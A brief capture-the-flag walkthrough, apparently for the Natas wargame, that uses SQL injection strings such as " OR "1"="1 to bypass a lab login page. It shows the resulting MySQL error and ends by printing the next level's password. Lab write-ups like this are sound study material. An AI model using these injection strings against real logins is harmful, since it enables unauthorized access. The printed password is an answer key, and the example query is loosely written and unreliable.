When we login witb the credentials from the previous challenge we see a login page where we have to enter our username and password.

First approach is to Use SQL injections.

Firstly, we need to trigger an error in the application.
' OR '1'='1:First entry
we are basically trying to enter a SQL query which is tru so that the admin gives access to us.
SO, the query for this would look like

SELECT *from <Tablename> WHERE Username="" ' OR '1'='1; [1=1 is always a true statement so in some cases it might give us access] ACCESS DENIED

' OR "1"="1:Second entry
This triggers an error in the application

Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
Access denied!

" OR "1"="1

Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
